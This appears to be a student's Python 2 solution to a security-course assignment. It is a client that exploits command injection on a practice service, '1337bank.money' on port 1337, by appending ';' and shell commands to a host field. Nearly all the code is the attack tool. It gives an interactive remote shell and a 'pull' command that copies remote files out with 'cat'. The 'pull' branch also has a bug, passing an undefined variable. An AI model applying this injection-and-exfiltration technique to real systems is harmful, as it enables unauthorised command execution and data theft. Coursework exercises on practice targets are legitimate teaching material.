"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_input(input):
    
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    
    print("IMPLEMENT ME")


if __name__ == '__main__':
    print("IMPLEMENT ME")

"""
import socket
import sys

host = "1337bank.money"
port = 1337

cur_dir = "/"

def quit():
    sys.exit()

def print_help():
    print("The following are valid commands:")
    print("1. shell -> Drop into an interactive shell and allow users to gracefully exit")
    print("2. pull <remote-path> <local-path> -> Download files")
    print("3. help -> Shows this help menu")
    print("4. quit -> Quit the shell")

def execute_shell(cmd):
    global cur_dir   
    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)   # Receives 1024 bytes from IP/Port

    if "cd" not in cmd and len(cur_dir) > 1:
        tmp = "cd " + cur_dir[1:] + ";" + cmd
        #print("tmp "+ tmp)
        s.send(host + ";" + tmp + "\n")
    elif "cd" not in cmd:
        tmp = "cd " + cur_dir + ";" + cmd
        s.send(host + ";" + tmp + "\n")
    else:
        s.send(host + ";" + cur_dir + ";" + cmd + "\n")

    data = s.recv(1024)
    data = s.recv(1024)

    if cmd == "ls":
        #for ls command
        data = data.split('\n')
        for item in data: 
            print(item.rstrip()),
    elif cmd.startswith("cd"):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        cur_dir = cur_dir[1:]
        tmp = cur_dir + cmd + ";" + "pwd"
        #print("temp" + tmp)
        data = s.recv(1024)
        s.send(host + ";" + tmp + "\n")
        data = s.recv(1024)
        data = s.recv(1024)
        cur_dir = data.rstrip()
        #print("cur_dir  " + cur_dir)
    else: 
        print(data)

    print('\n' )
    
def execute_pull(cmd):

    remote_path = cmd.split(" ")[1]
    local_path = cmd.split(" ")[2]

    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)   # Receives 1024 bytes from IP/Port

    s.send(host + ";" + "cat " + remote_path + ";\n")

    data = s.recv(1024)
    cat_file  = s.recv(1024)
    open_file = open(local_path, "w+")
    print(cat_file)
    open_file.write(cat_file)
    open_file.close()
        
if __name__ == '__main__':

    input = raw_input("> ")

    if input == "shell":
        while True:
            #execute_shell("pwd")
            if len(cur_dir) > 1:
                cmd = raw_input(cur_dir[1:] + "> ") 
            else:
                cmd = raw_input(cur_dir + "> ")
            if cmd == "help":
                print_help()    
            elif cmd == "exit":
                quit()
            else:
                execute_shell(cmd) 

    elif input.startswith("pull"):
        execute_pull(cmd)

    elif input == "help":
        print_help()

    elif input == "quit":
        quit()